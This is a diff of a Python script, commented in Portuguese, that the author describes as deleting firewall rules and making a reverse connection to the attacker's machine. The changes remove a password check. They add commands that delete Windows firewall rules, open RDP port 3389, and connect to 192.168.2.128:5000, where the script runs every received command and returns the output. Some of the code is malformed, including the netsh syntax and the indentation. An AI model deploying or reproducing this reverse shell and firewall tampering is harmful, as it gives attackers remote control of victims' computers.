@@ -1,3 +1,6 @@
+#--!---Desenvolvido pelo Keidi Francis--!--#
+#--!--Este script elimina regras do firewall e faz uma conexão reversa com máquina do atacante --!--#
+
 import os,sys
 import socket
 import subprocess
@@ -14,26 +17,20 @@ print ("-----------------------------------------------------------------")
 print ("[+] Version 1.0 [+] Keidi Francis [+] Use for good please")
 print ("-----------------------------------------------------------------")
 
-secret = "lopes"
-login = input(str("Digite a senha: "))
-#os.getlogin()
-if login == secret:
-       
-        part = "ALLOW TCP PORT 3389"
-        #os.system("netsh.exe delete rules ")
-        subprocess.run("netsh.exe advfirewall firewall add rule name=",ALLOW TCP PORT 3389," dir=in action=allow protocol=TCP localhost=3389")
-        
-        host = "192.168.2.128"
-        port = 5000
-        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect((host,port))
-        while True:
+# Eliminar regras do firewall     
+ os.system("netsh.exe delete rules ")
+ # Abilitar/Adicionar regra de firewall a porta 3389
+ os.system('netsh.exe advfirewall firewall add rule name=",ALLOW TCP PORT 3389," dir=in action=allow protocol=TCP localhost=3389')
+
+# Add teu ip       
+host = "192.168.2.128"
+port = 5000 #Porta
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+s.connect((host,port))
+while True:
                 cmd = s.recv(1024).decode()
                 for comando in os.popen(cmd):
-                        s.send(comando.encode())
+                	s.send(comando.encode())
 
-else:
-        print ("---------------------------------------------------")
-        print ("\t\t[!] Incorreto Por favor nao tente mais - John")
-        print ("---------------------------------------------------")
 
